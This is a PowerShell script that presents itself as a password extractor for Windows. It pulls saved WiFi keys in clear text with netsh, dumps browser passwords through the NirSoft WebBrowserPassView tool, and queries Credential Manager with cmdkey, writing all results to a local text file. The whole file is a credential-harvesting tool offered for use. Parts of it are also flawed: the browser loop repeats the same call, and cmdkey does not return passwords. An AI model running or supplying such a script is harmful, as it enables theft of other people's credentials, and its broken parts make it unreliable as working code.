# Define the output file path
$outputFile = "C:\extracted_passwords.txt"

# Clear any existing content in the output file
Clear-Content -Path $outputFile

# Function to extract WiFi passwords
function Get-WiFiPasswords {
    $wifiProfiles = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }

    foreach ($profile in $wifiProfiles) {
        $wifiDetails = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content\W+:\W+(.+)$" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }
        if ($wifiDetails) {
            $wifiResult = "SSID: $profile | Password: $wifiDetails"
            $wifiResult | Out-File -Append -FilePath $outputFile
            Write-Output $wifiResult
        }
    }
}

# Function to extract saved credentials from browsers using third-party tool Nirsoft WebBrowserPassView (this tool should be in the same directory as the script)
function Get-BrowserPasswords {
    $browsers = @("chrome", "firefox", "edge")
    foreach ($browser in $browsers) {
        $browserPasswords = .\WebBrowserPassView.exe /sjson
        if ($browserPasswords) {
            $browserPasswords | Out-File -Append -FilePath $outputFile
            Write-Output $browserPasswords
        }
    }
}

# Function to extract saved credentials from Windows Credential Manager
function Get-WindowsCredentialManagerPasswords {
    $credentials = cmdkey /list | Select-String -Pattern "Target" | ForEach-Object { $_.ToString().Trim() }

    foreach ($credential in $credentials) {
        $credDetails = cmdkey /list:$credential | Select-String -Pattern "User\|Password" | ForEach-Object { $_.ToString().Trim() }
        if ($credDetails) {
            $credResult = "Credential: $credential | $credDetails"
            $credResult | Out-File -Append -FilePath $outputFile
            Write-Output $credResult
        }
    }
}

# Execute all functions
Get-WiFiPasswords
Get-BrowserPasswords
Get-WindowsCredentialManagerPasswords

Write-Output "Passwords have been extracted to C:\extracted_passwords.txt"
